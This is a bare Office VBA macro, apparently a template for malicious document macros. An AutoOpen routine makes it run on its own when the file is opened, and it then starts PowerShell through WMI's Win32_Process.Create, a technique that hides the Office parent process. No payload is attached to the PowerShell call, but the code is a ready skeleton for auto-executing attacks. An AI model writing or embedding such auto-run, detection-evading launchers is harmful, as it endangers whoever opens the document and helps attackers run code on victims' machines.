Sub MyMacro
    strArg = "powershell"
    GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
    MyMacro
End Sub